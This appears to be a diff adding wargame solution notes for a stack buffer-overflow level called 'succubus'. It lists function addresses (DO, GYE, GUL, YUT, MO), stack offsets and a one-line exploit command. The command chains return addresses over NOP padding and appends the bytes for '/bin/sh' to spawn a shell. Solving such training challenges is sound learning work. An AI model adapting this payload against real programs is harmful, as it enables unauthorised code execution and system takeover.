@@ -1,0 +1,26 @@
+<address of DO, GYE, GUL, YUT, MO>
+
+	0x80487ec, 0x80487bc, 0x804878c, 0x804875c, 0x8048724
+
+</address of DO, GYE, GUL, YUT, MO>
+
+<ebp, ret, beyond+100>
+
+	ebp: 0xbffffa08
+	ret: 0xbffffa0c
+	beyond+100: 0xbffffa74
+	beyond+100-12: 0xbffffa68
+
+</ebp, ret, beyond+100>
+
+<address of "/bin/my-pass">
+
+	0xbffffab8
+
+</address of "/bin/my-pass">
+
+<command>
+
+	./succubus "$(for x in `seq 1 44`; do printf "\x90"; done)$(printf "\xec\x87\x04\x08")$(printf "\xbc\x87\x04\x08")$(printf "\x8c\x87\x04\x08")$(printf "\x5c\x87\x04\x08")$(printf "\x24\x87\x04\x08")aaaa$(printf "\x6d\xfa\xff\xbf")$(for x in `seq 1 69`; do printf "\x90"; done)$(printf "\x2f\x62\x69\x6e\x2f\x73\x68")"
+
+</command>
